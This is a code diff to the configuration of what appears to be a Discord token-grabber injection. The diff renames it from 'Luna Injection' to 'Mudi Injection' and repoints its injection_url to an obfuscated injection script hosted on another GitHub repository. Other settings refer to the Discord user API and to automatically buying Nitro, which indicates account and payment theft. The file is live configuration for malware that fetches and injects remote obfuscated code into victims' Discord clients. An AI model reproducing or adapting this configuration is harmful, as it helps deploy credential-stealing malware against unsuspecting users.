@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@everyone', 
-  embed_name: 'Luna Injection', 
-  embed_icon: 'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096', 
+  embed_name: 'Mudi Injection', 
+  embed_icon: 'https://i.ibb.co/TvR6M16/fqw.png', 
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/OfficialMudi/Mudi-Grabber-Injection/main/injection-obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
